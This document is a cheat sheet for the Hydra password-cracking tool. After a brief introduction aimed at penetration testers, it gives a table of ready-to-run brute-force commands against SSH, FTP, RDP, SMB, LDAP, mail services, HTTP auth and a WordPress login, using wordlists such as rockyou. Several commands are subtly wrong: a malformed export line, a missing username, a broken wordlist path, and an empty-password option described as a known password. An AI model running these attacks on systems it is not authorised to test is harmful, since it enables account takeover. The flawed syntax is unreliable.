# 🐉 Hydra

Hydra is a popular open-source password cracking tool that can be used to perform brute-force attacks on login credentials of various network protocols, including FTP, HTTP, SSH, Telnet, and others. It uses different attack methods, including dictionary attacks, brute-force attacks, and hybrid attacks, to guess passwords and gain unauthorized access to a system.

Hydra can be used to test the strength of passwords used in network systems and identify potential vulnerabilities that may be exploited by attackers. It is often used by security professionals, network administrators, and penetration testers as a tool to assess the security of their systems and identify weaknesses that need to be addressed.

The following table uses the $ip variable which can be set with the following command:

`export ip 10.10.10.2`

| Command                                                                                                                                      | Description                                          |
| -------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
| hydra -P password-file.txt -v $ip snmp                                                                                                       | Hydra brute force against SNMP                       |
| hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp                                                                          | Hydra FTP known user and rockyou password list       |
| hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh                                                                                 | Hydra SSH using list of users and passwords          |
| hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh                                                                                            | Hydra SSH using a known password and a username list |
| hydra $ip -s 22 ssh -l -P big\_wordlist.txt                                                                                                  | Hydra SSH Against Known username on port 22          |
| hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V                                                                             | Hydra POP3 Brute Force                               |
| hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V                                                                                            | Hydra SMTP Brute Force                               |
| hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin                                                                                    | Hydra attack http get 401 login with a dictionary    |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip                                                              | Hydra attack Windows Remote Desktop with rockyou     |
| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb                                                                | Hydra brute force SMB user with rockyou:             |
| hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^\&pwd=^PASS^\&wp-submit=Log In\&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login            |
| hydra -L usernames.txt -P passwords.txt $ip smb -V -f                                                                                        | SMB Brute Forcing                                    |
| hydra -L users.txt -P passwords.txt $ip ldap2 -V -f                                                                                          | LDAP Brute Forcing                                   |
